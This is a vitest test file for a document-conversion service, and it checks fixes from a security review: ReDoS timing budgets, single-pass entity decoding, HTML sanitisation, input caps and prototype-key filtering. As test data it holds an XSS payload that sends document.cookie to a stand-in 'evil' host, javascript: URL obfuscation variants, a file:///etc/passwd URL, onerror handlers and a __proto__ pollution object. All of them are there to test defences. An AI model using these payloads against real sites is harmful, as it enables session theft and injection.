/**
 * ADR-100 Amendment 1 — the review's findings, held in place:
 * quadratic tag and marker scans (a budget for every shape the review
 * measured, and a few more), the double-decoded entity, the unsanitised
 * md-to-html output, the caps that never ran, prototype-shaped option
 * keys, the silent pipeline options, and the declared-but-unreachable
 * formats.
 */

import { describe, it, expect } from 'vitest';
import { ConvertService, mergeOptions } from '../../convert/service.js';
import { ConverterRegistry } from '../../convert/registry.js';
import { createDefaultRegistry } from '../../convert/converters/index.js';
import { CONVERT_ERROR_CODES } from '../../convert/errors.js';
import { MAX_INPUT_BYTES, MARKUP_INPUT_BYTES, TEXT_SCAN_INPUT_BYTES, type Converter } from '../../convert/types.js';
import { decodeEntities } from '../../convert/html-entities.js';
import { sanitizeHtml, isSafeUrl } from '../../convert/sanitize-html.js';
import { ForwardSearch, removeElements, stripTags, replaceBracketed, elementContent } from '../../convert/scan.js';
import { htmlToText, stripAllTags, readableText, extractMainContent, textIssues } from '../../convert/converters/html-to-text.js';
import { stripMarkdown, stripInline, strippedIssues } from '../../convert/converters/md-to-text.js';
import { mdToHtml, titleFromMarkdown } from '../../convert/converters/md-to-html.js';
import { htmlToMd, markdownIssues } from '../../convert/converters/html-to-md.js';
import { codeToMd, detectLanguage } from '../../convert/converters/code-to-md.js';
import { codeToHtml } from '../../convert/converters/code-to-html.js';
import { IMPORT_PATTERN } from '../../convert/converters/jupyter-to-python.js';
import { delimited } from '../../convert/converters/delimited.js';
import { jsonToCsv, escapeCsvField, outputDelimiter } from '../../convert/converters/json-to-csv.js';

/** Generous: the linear versions take tens of milliseconds; the regexes took 5–27 s at these sizes. */
const BUDGET_MS = 1500;

function timed(fn: () => unknown): number {
  const t0 = performance.now();
  fn();
  return performance.now() - t0;
}

const step = { step: 1, of: 1 };

describe('hostile inputs finish in linear time', () => {
  const cases: Array<[string, () => unknown]> = [
    ["'<script'.repeat(200000) through strip", () => stripAllTags('<script'.repeat(200000))],
    ["'<script>'.repeat(200000) through strip (openers with a >, never a closer)", () => stripAllTags('<script>'.repeat(200000))],
    ["'<script'.repeat(200000) through readable", () => readableText('<script'.repeat(200000))],
    ["'<'.repeat(300000) through stripTags", () => stripTags('<'.repeat(300000))],
    ["'<li'.repeat(200000) through readable", () => readableText('<li'.repeat(200000))],
    ["'<li '.repeat(200000) through readable", () => readableText('<li '.repeat(200000))],
    ["'<div '.repeat(100000) through extractMainContent", () => extractMainContent('<div '.repeat(100000))],
    ["'<div role=\"main\">'.repeat(100000) through extractMainContent", () => extractMainContent('<div role="main">'.repeat(100000))],
    ["'<article'.repeat(100000) through extractMainContent", () => extractMainContent('<article'.repeat(100000))],
    ["'<!--'.repeat(100000) through strip", () => stripAllTags('<!--'.repeat(100000))],
    ["'!['.repeat(200000) through stripMarkdown", () => stripMarkdown('!['.repeat(200000))],
    ["'['.repeat(200000) + ']' through stripMarkdown", () => stripMarkdown('['.repeat(200000) + ']')],
    ["'[a'.repeat(100000) + ']x' through stripInline", () => stripInline('[a'.repeat(100000) + ']x')],
    ["'[\\n'.repeat(100000) through stripMarkdown", () => stripMarkdown('[\n'.repeat(100000))],
    ["'&amp;'.repeat(200000) through decodeEntities", () => decodeEntities('&amp;'.repeat(200000))],
    ["'<a'.repeat(200000) through textIssues", () => textIssues('<a'.repeat(200000))],
    ["'\\n'.repeat(300000) through titleFromMarkdown", () => titleFromMarkdown('\n'.repeat(300000))],
    ["'\\n'.repeat(300000) through detectLanguage", () => detectLanguage('\n'.repeat(300000))],
    ["'from x import y' + ' '.repeat(200000) through IMPORT_PATTERN", () => IMPORT_PATTERN.test('from x import y' + ' '.repeat(200000))],
    ["'<a href=\"'.repeat(100000) through sanitizeHtml", () => sanitizeHtml('<a href="'.repeat(100000))],
    ["'<b '.repeat(200000) through sanitizeHtml", () => sanitizeHtml('<b '.repeat(200000))],
    ["'<script'.repeat(200000) through sanitizeHtml", () => sanitizeHtml('<script'.repeat(200000))],
    ["'<a x=\"' + '<'.repeat(50) + '\"' × 5000 through sanitizeHtml", () => sanitizeHtml(('<a x="' + '<'.repeat(50) + '"').repeat(5000))],
    ["'<script'.repeat(100000) through markdownIssues", () => markdownIssues('<script'.repeat(100000))],
    ["'['.repeat(200000) through strippedIssues", () => strippedIssues('['.repeat(200000))],
  ];
  for (const [name, fn] of cases) {
    it(name, () => {
      const ms = timed(fn);
      expect(ms, `${name} took ${ms.toFixed(0)} ms`).toBeLessThan(BUDGET_MS);
    });
  }

  it("the review's cases end to end: a megabyte of `<script` to text and 400 KB of `![` to text answer inside the budget", async () => {
    const service = new ConvertService({ registry: createDefaultRegistry() });
    const t0 = performance.now();
    const html = await service.convert({ input: '<script'.repeat(150000), from: 'html', to: 'text' });
    expect(typeof html.output).toBe('string');
    const md = await service.convert({ input: '!['.repeat(200000), from: 'md', to: 'text' });
    expect(md.output).toBe('!['.repeat(200000));
    expect(performance.now() - t0).toBeLessThan(2 * BUDGET_MS);
  });

  it('ForwardSearch remembers a miss for every later start and a hit while the start stays before it', () => {
    const s = new ForwardSearch('ab]cd]');
    expect(s.indexOf(']', 0)).toBe(2);
    expect(s.indexOf(']', 1)).toBe(2);
    expect(s.indexOf(']', 3)).toBe(5);
    expect(s.indexOf(']', 6)).toBe(-1);
    expect(s.indexOf(']', 7)).toBe(-1);
    expect(s.indexOf(']', 0)).toBe(2);
  });
});

describe('the linear scans keep the regex semantics', () => {
  it('stripTags: a tag runs to the first >, a < without a > is text, <> is text', () => {
    expect(stripTags('<p>a</p> <a <b>c')).toBe('a c');
    expect(stripTags('a < b > c')).toBe('a  c');
    expect(stripTags('a <> b')).toBe('a <> b');
    expect(stripTags('a < b')).toBe('a < b');
  });
  it('removeElements: whole elements with their bodies, comments, case-insensitive; a body that never closes is dropped to the end', () => {
    expect(removeElements('<p>a</p><SCRIPT type="x">alert(1)</script ><!-- c --><p>b</p>', ['script'])).toBe('<p>a</p><p>b</p>');
    expect(removeElements('<p>a</p><script>x', ['script'])).toBe('<p>a</p>');
    expect(removeElements('<scripts>k</scripts><script>x</script>', ['script'])).toBe('<scripts>k</scripts>');
    expect(removeElements('<p>a<!-- open', ['script'])).toBe('<p>a');
  });
  it('elementContent: the first element that qualifies, up to its first closer', () => {
    expect(elementContent('<div>x</div><div role="main">M<div>n</div></div>', 'div', (t) => /role="main"/.test(t))).toBe('M<div>n');
    expect(elementContent('<main', 'main')).toBeNull();
    expect(elementContent('<main>never closes', 'main')).toBeNull();
    expect(elementContent('<mainframe>x</mainframe><main class="m">M</main>', 'main')).toBe('M');
  });
  it('replaceBracketed: images, links and references as the regexes read them', () => {
    expect(replaceBracketed('a ![alt](i.png) b', '![', ']', '(', ')')).toBe('a alt b');
    expect(replaceBracketed('[x](y) [p][q] [r]s', '[', ']', '(', ')')).toBe('x [p][q] [r]s');
    expect(replaceBracketed('[a[b](c)', '[', ']', '(', ')')).toBe('a[b');
    expect(replaceBracketed('[a]( b )', '[', ']', '(', ')')).toBe('a');
    expect(stripMarkdown('[![alt](img.png)](https://x.io)')).toBe('alt');
  });
});

describe('entities decode once', () => {
  it('an escaped entity is never a live tag after decoding', async () => {
    expect(decodeEntities('&amp;lt;script&amp;gt;')).toBe('&lt;script&gt;');
    expect(decodeEntities('&amp;amp;')).toBe('&amp;');
    expect(decodeEntities('&amp;#60;')).toBe('&#60;');
    const r = await htmlToText.execute('<p>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</p>', 'strip', {});
    expect(r.output).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
    expect(r.warnings).toEqual(['undecoded HTML entities remain in the output']);
  });
});

describe('md-to-html sanitises by default', () => {
  const HOSTILE = '# T\n\nok <script>fetch("//evil/"+document.cookie)</script> <img src=x onerror="alert(1)"> [l](javascript:alert(1)) <a href="JaVaScRiPt:alert(2)">j</a>\n\n<div style="x" onclick="y" class="c">d</div>';
  it('drops scripts, event handlers, inline styles and javascript: URLs from every strategy', async () => {
    for (const strategy of ['standard', 'enhanced', 'styled']) {
      const r = await mdToHtml.execute(HOSTILE, strategy, { sanitize: true }, { from: 'md', to: 'html', ...step });
      expect(r.output, strategy).not.toMatch(/<script|onerror|onclick|javascript:|style=/i);
      expect(r.output, strategy).toContain('ok ');
      expect(r.output, strategy).toContain('<div class="c">d</div>');
      expect(r.stats).toMatchObject({ sanitized: true });
    }
  });
  it('sanitize: false is the raw render, for Markdown you wrote yourself', async () => {
    const r = await mdToHtml.execute(HOSTILE, 'styled', { sanitize: false }, { from: 'md', to: 'html', ...step });
    expect(r.output).toContain('<script>');
    expect(r.stats).toMatchObject({ sanitized: false });
    expect(mdToHtml.spec.options?.find((o) => o.name === 'sanitize')).toMatchObject({ type: 'boolean', default: true });
  });
  it('clean Markdown renders byte-identically with and without the sanitiser', async () => {
    const md = '# Title\n\nSome *text* with a [link](https://x.io/?a=1&b=2 "t") and `code`.\n\n| a | b |\n|:--|--:|\n| 1 | 2 |\n\n- [x] done\n- [ ] todo\n\n```js\nconst a = 1;\n```\n\n![pic](i.png)\n\n> quote\n\n1. one\n2. two\n\n---\n\nmail me: <a@b.co>';
    const raw = await mdToHtml.execute(md, 'enhanced', { sanitize: false });
    const clean = await mdToHtml.execute(md, 'enhanced', {});
    expect(clean.output).toBe(raw.output);
    expect(clean.output).toContain('<input checked="" disabled="" type="checkbox">');
    // marked leaves the raw & in an href; the sanitiser emits the attribute as written.
    expect(clean.output).toContain('<a href="https://x.io/?a=1&b=2" title="t">');
    expect(clean.output).toContain('<a href="mailto:a@b.co">');
  });
});

describe('sanitizeHtml', () => {
  it('keeps known elements and attributes, drops the rest, keeps the text of unknown elements', () => {
    expect(sanitizeHtml('<p>ok</p><script>fetch("//evil/"+document.cookie)</script><img src="x" onerror="alert(1)"><a href="javascript:alert(1)">x</a>')).toBe('<p>ok</p><img src="x"><a>x</a>');
    expect(sanitizeHtml('<font color="red">r</font><marquee>m</marquee><center>c</center>')).toBe('rm<center>c</center>');
    expect(sanitizeHtml('<div style="x" class="c" onclick="y" id="i" data-x="1">d</div>')).toBe('<div class="c" id="i">d</div>');
    expect(sanitizeHtml('<input type="checkbox" checked="" disabled=""> <input type="text" value="v"> <button>b</button><textarea>t</textarea><form action="/x"><select><option>o</option></select></form>')).toBe('<input type="checkbox" checked="" disabled="">  ');
    expect(sanitizeHtml('<iframe src="https://x"></iframe><svg><script>1</script></svg><object data="x">o</object><style>p{}</style><!-- c --><template>t</template>')).toBe('');
    expect(sanitizeHtml('<html><head><title>T</title><meta charset="utf-8"></head><body onload="x"><p>b</p></body></html>')).toBe('<p>b</p>');
    expect(sanitizeHtml('<p>a < b</p><p>1 &lt; 2 &amp; 3</p><b <i>x</i>')).toBe('<p>a &lt; b</p><p>1 &lt; 2 &amp; 3</p>&lt;b <i>x</i>');
    expect(sanitizeHtml('<a href="x')).toBe('&lt;a href="x');
    expect(sanitizeHtml('<a href="https://x.io/?q=1>2" title="t>u">z</a>')).toBe('<a href="https://x.io/?q=1>2" title="t>u">z</a>');
    expect(sanitizeHtml('<A HREF="https://x.io" Target="_blank">z</A>')).toBe('<a href="https://x.io">z</a>');
    expect(sanitizeHtml('<img src=x.png alt=pic>')).toBe('<img src="x.png" alt="pic">');
    expect(sanitizeHtml('<details open><summary>s</summary>d</details><ol start="3"><li value="4">i</li></ol><th scope="col" colspan="2">h</th>')).toBe('<details open><summary>s</summary>d</details><ol start="3"><li value="4">i</li></ol><th scope="col" colspan="2">h</th>');
    expect(sanitizeHtml('no tags & entities &copy; stay')).toBe('no tags & entities &copy; stay');
  });
  it('judges URLs the way a browser reads them', () => {
    const keep = ['https://x.io/a?b=1&amp;c=2', 'http://x', 'mailto:a@b.co', 'tel:+1', '#top', '/docs', '?q=1', './a', '../a', 'page.html', 'docs/a b.html'];
    for (const u of keep) expect(isSafeUrl(u), u).toBe(true);
    const drop = [
      'javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'java\tscript:alert(1)', ' javascript:alert(1)', 'jav&#x09;ascript:alert(1)', '&#106;avascript:alert(1)',
      'javascript&colon;alert(1)', 'vbscript:x', 'data:text/html;base64,AAAA', 'data:image/svg+xml;base64,AAAA', 'file:///etc/passwd', 'x&Tab;y:z',
    ];
    for (const u of drop) expect(isSafeUrl(u), u).toBe(false);
    expect(isSafeUrl('data:image/png;base64,iVBORw0KGgo=', true)).toBe(true);
    expect(isSafeUrl('data:image/png;base64,iVBORw0KGgo=', false)).toBe(false);
    expect(sanitizeHtml('<img src="data:image/png;base64,AAAA"><a href="data:image/png;base64,AAAA">d</a><a href="javascript&colon;alert(1)">e</a><img src="data:text/html,x">')).toBe('<img src="data:image/png;base64,AAAA"><a>d</a><a>e</a><img>');
  });
});

describe('caps and budgets', () => {
  it('the service cap refuses an input above 25 MB before any converter runs', async () => {
    let executed = 0;
    const registry = new ConverterRegistry();
    registry.register({
      spec: { id: 'text-to-md', title: 't', description: 'd', from: ['text'], to: ['md'], engine: 'pure', strategies: [{ id: 'x', description: '', when: '' }], defaultStrategy: 'x' },
      async execute(input) {
        executed += 1;
        return { output: input };
      },
    });
    const service = new ConvertService({ registry });
    const big = 'a'.repeat(MAX_INPUT_BYTES + 1);
    await expect(service.convert({ input: big, from: 'text', to: 'md' })).rejects.toMatchObject({ code: CONVERT_ERROR_CODES.TOO_LARGE, context: { max: MAX_INPUT_BYTES } });
    expect(executed).toBe(0);
    await service.convert({ input: 'a'.repeat(MAX_INPUT_BYTES), from: 'text', to: 'md' });
    expect(executed).toBe(1);
  }, 30000);
  it("a converter's own cap applies to what reaches it, step by step", async () => {
    const service = new ConvertService({ registry: createDefaultRegistry() });
    expect(mdToHtml.spec.maxInputBytes).toBe(MARKUP_INPUT_BYTES);
    expect(htmlToMd.spec.maxInputBytes).toBe(MARKUP_INPUT_BYTES);
    expect(codeToHtml.spec.maxInputBytes).toBe(MARKUP_INPUT_BYTES);
    expect(htmlToText.spec.maxInputBytes).toBe(TEXT_SCAN_INPUT_BYTES);
    await expect(service.convert({ input: 'a'.repeat(MARKUP_INPUT_BYTES + 1), from: 'md', to: 'html' })).rejects.toMatchObject({
      code: CONVERT_ERROR_CODES.TOO_LARGE,
      context: { converterId: 'md-to-html', max: MARKUP_INPUT_BYTES, step: 1, of: 1 },
    });
    const registry = new ConverterRegistry();
    const grow: Converter = {
      spec: { id: 'text-to-md', title: 't', description: 'd', from: ['text'], to: ['md'], engine: 'pure', strategies: [{ id: 'x', description: '', when: '' }], defaultStrategy: 'x' },
      async execute(input) {
        return { output: input.repeat(3) };
      },
    };
    const small: Converter = {
      spec: { id: 'md-to-html', title: 't', description: 'd', from: ['md'], to: ['html'], engine: 'pure', maxInputBytes: 100, strategies: [{ id: 'x', description: '', when: '' }], defaultStrategy: 'x' },
      async execute(input) {
        return { output: input };
      },
    };
    registry.register(grow);
    registry.register(small);
    const two = new ConvertService({ registry });
    await expect(two.convert({ input: 'b'.repeat(50), from: 'text', to: 'html' })).rejects.toMatchObject({ code: CONVERT_ERROR_CODES.TOO_LARGE, context: { converterId: 'md-to-html', step: 2, of: 2, inputBytes: 150, max: 100 } });
    const ok = await two.convert({ input: 'b'.repeat(30), from: 'text', to: 'html' });
    expect(ok.output.length).toBe(90);
    expect(two.capabilities().converters.map((c) => c.maxInputBytes)).toEqual([null, 100]);
  });
});

describe('options', () => {
  it('mergeOptions drops prototype-shaped keys', () => {
    const merged = mergeOptions(mdToHtml, JSON.parse('{"__proto__": {"polluted": true}, "constructor": 1, "prototype": 2, "title": "T"}') as Record<string, unknown>);
    expect(merged).toEqual({ sanitize: true, title: 'T' });
    expect(Object.getPrototypeOf(merged)).toBe(Object.prototype);
    expect((merged as { polluted?: unknown }).polluted).toBeUndefined();
    expect(({} as { polluted?: unknown }).polluted).toBeUndefined();
  });
  it('options given to a multi-step pipeline are named in a warning, like a strategy is', async () => {
    const service = new ConvertService({ registry: createDefaultRegistry() });
    const r = await service.convert({ input: 'a,b\n1,2', from: 'csv', to: 'yaml', options: { indent: 4, flowLevel: 1 } });
    expect(r.steps.map((s) => s.converterId)).toEqual(['csv-to-json', 'json-to-yaml']);
    expect(r.warnings.some((w) => w.startsWith('options {indent, flowLevel} are offered to every step of this 2-step pipeline'))).toBe(true);
    const one = await service.convert({ input: 'a,b\n1,2', from: 'csv', to: 'json', options: { indent: 4 } });
    expect(one.warnings.some((w) => w.startsWith('options {'))).toBe(false);
  });
});

describe('the format graph is honest', () => {
  const registry = createDefaultRegistry();
  const service = new ConvertService({ registry });
  it('py is read by the code converters and tsv is written: the pairs the review found missing resolve directly', () => {
    for (const [from, to, via] of [['py', 'md', 'code-to-md'], ['py', 'html', 'code-to-html'], ['csv', 'tsv', 'delimited'], ['tsv', 'csv', 'delimited'], ['json', 'tsv', 'json-to-csv']]) {
      expect(service.pipeline(from as string, to as string).steps.map((s) => s.converterId), `${from}→${to}`).toEqual([via]);
    }
    const formats = Object.fromEntries(service.capabilities().formats.map((f) => [f.id, [f.asSource, f.asTarget]]));
    expect(formats).toMatchObject({ code: [true, false], py: [true, true], tsv: [true, true], csv: [true, true], md: [true, true], html: [true, true] });
    expect(() => service.pipeline('md', 'code')).toThrow(/No conversion/);
    expect(registry.all().length).toBe(19);
    // 50 pairs before the amendment (the review's count); py→md/html, csv↔tsv and the tsv targets add the rest.
    expect(registry.reachablePairs().length).toBe(57);
  });
  it('delimited re-quotes for the target and keeps cells as they are', async () => {
    const toTsv = await delimited.execute('a,b\n"1,5",2\n"x ""q""",y', 'requote', {}, { from: 'csv', to: 'tsv', ...step });
    // A field holding a quote stays quoted in TSV too: that is what parseDelimited reads back.
    expect(toTsv.output).toBe('a\tb\n1,5\t2\n"x ""q"""\ty');
    expect(toTsv.stats).toMatchObject({ rowCount: 3, columnCount: 2, from: ',', to: 'tab' });
    const back = await delimited.execute(toTsv.output, 'requote', {}, { from: 'tsv', to: 'csv', ...step });
    expect(back.output).toBe('a,b\n"1,5",2\n"x ""q""",y');
    const ragged = await delimited.execute('a,b\n1', 'requote', {}, { from: 'csv', to: 'tsv', ...step });
    expect(ragged.warnings).toEqual(['1 row(s) have a different number of fields than the first row']);
    const whole = await service.convert({ input: 'a,b\n007,x', from: 'csv', to: 'tsv' });
    expect(whole.output).toBe('a\tb\n007\tx');
    expect(whole.mimeType).toBe('text/tab-separated-values');
  });
  it('json-to-csv writes tabs for a tsv target and honours an explicit delimiter', async () => {
    const tsv = await jsonToCsv.execute('[{"a":"x,y","b":1}]', 'flat', {}, { from: 'json', to: 'tsv', ...step });
    expect(tsv.output).toBe('a\tb\nx,y\t1');
    expect(tsv.stats).toMatchObject({ delimiter: 'tab' });
    const semi = await jsonToCsv.execute('[{"a":"x;y","b":1}]', 'flat', { delimiter: ';' }, { from: 'json', to: 'csv', ...step });
    expect(semi.output).toBe('a;b\n"x;y";1');
    expect(escapeCsvField('a,b')).toBe('"a,b"');
    expect(escapeCsvField('a,b', '\t')).toBe('a,b');
    expect(outputDelimiter(undefined, 'tsv')).toBe('\t');
    expect(outputDelimiter('\\t', 'csv')).toBe('\t');
    expect(outputDelimiter(undefined, 'csv')).toBe(',');
  });
  it('a py source is fenced and highlighted as Python without being told', async () => {
    const md = await codeToMd.execute('print(1)', 'fenced', {}, { from: 'py', to: 'md', ...step });
    expect(md.output).toContain('```python');
    expect(md.stats).toMatchObject({ language: 'python', languageSource: 'format' });
    const html = await codeToHtml.execute('print(1)', 'fragment', {}, { from: 'py', to: 'html', ...step });
    expect(html.stats).toMatchObject({ language: 'python', autoDetected: false });
    const generic = await codeToMd.execute('print(1)', 'fenced', {}, { from: 'code', to: 'md', ...step });
    expect(generic.stats?.['languageSource']).not.toBe('format');
  });
});

describe('the other regexes the audit touched', () => {
  it('titleFromMarkdown reads the first heading without crossing lines', () => {
    expect(titleFromMarkdown('# Title')).toBe('Title');
    expect(titleFromMarkdown('\n\n  # Spaced  ##\nbody')).toBe('Spaced');
    expect(titleFromMarkdown('no heading\n# later')).toBe('later');
  });
  it('IMPORT_PATTERN still reads the lines it did', () => {
    for (const line of ['import os', 'import numpy as np', 'import a, b', 'import a.b as c, d', 'from x import y', 'from . import z', '  import re', 'import os  # comment']) {
      expect(IMPORT_PATTERN.test(line), line).toBe(true);
    }
    for (const line of ['importance = 1', '# import os', 'import fs from "fs"', 'import os; os.getcwd()', 'x = 1', 'from x import ']) {
      expect(IMPORT_PATTERN.test(line), line).toBe(false);
    }
  });
  it('detectLanguage still finds each language from its own tells', () => {
    expect(detectLanguage('import os\nfrom sys import argv\n')).toBe('python');
    expect(detectLanguage('import fs from "fs";\nexport default fs;')).toBe('javascript');
    expect(detectLanguage('   fn main() {}')).toBe('rust');
  });
  it('html-to-md flattens a cell across lines the same way', async () => {
    const r = await htmlToMd.execute('<table><tr><td>1<br>x</td><td><p>2</p></td></tr><tr><td>3</td><td>4</td></tr></table>', 'turndown', {});
    expect(r.output).toBe('|  |  |\n| --- | --- |\n| 1 x | 2 |\n| 3 | 4 |');
  });
});
